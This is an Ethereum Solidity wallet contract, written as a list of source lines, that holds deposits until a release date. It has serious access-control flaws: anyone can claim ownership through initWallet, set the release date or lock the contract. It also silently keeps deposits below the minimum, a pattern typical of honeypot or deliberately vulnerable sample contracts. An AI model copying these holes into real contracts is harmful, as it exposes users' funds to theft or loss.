['pragma solidity ^0.4.18;\n', '\n', 'contract ERC20 {\n', '    function balanceOf(address who) constant public returns (uint256);\n', '    function transfer(address to, uint256 amount) public;\n', '}\n', '\n', 'contract Wallet {\n', '    \n', '    event Deposit(address indexed depositor, uint amount);\n', '    event Withdrawal(address indexed to, uint amount);\n', '    event TransferOwnership(address indexed from, address indexed to);\n', '    \n', '    address Owner;\n', '    function transferOwnership(address to) onlyOwner {\n', '        TransferOwnership(Owner, to); Owner = to;\n', '    }\n', '    \n', '    mapping (address => uint) public Deposits;\n', '    uint minDeposit;\n', '    bool Locked = false;\n', '    uint Date;\n', '\n', '    function initWallet() payable open {\n', '        Owner = msg.sender;\n', '        minDeposit = 0.25 ether;\n', '        deposit();\n', '    }\n', '\n', '    function SetReleaseDate(uint NewDate) {\n', '        Date = NewDate;\n', '    }\n', '\n', '    function() public payable { deposit(); }\n', '\n', '    function deposit() public payable {\n', '        if (msg.value > 0) {\n', '            if (msg.value >= MinimumDeposit())\n', '                Deposits[msg.sender] += msg.value;\n', '            Deposit(msg.sender, msg.value);\n', '        }\n', '    }\n', '\n', '    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }\n', '    \n', '    function withdrawTo(address to, uint amount) public onlyOwner {\n', '        if (WithdrawalEnabled()) {\n', '            uint max = Deposits[msg.sender];\n', '            if (max > 0 && amount <= max) {\n', '                to.transfer(amount);\n', '                Withdrawal(to, amount);\n', '            }\n', '        }\n', '    }\n', '\n', '    function withdrawToken(address token) public payable onlyOwner {\n', '        if (WithdrawalEnabled())\n', '            withdrawTokenTo(token, msg.sender, ERC20(token).balanceOf(address(this)));\n', '    }\n', '\n', '    function withdrawTokenTo(address token, address to, uint amount) public payable onlyOwner {\n', '        if (WithdrawalEnabled()) {\n', '            uint bal = ERC20(token).balanceOf(address(this));\n', '            if (bal >= amount && amount > 0) {\n', '                ERC20(token).transfer(to, amount);\n', '            }\n', '        }\n', '    }\n', '\n', '    function MinimumDeposit() public constant returns (uint) { return minDeposit; }\n', '    function ReleaseDate() public constant returns (uint) { return Date; }\n', '    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }\n', '    function lock() public { Locked = true; }\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    modifier open { if (!Locked) _; }\n', '}']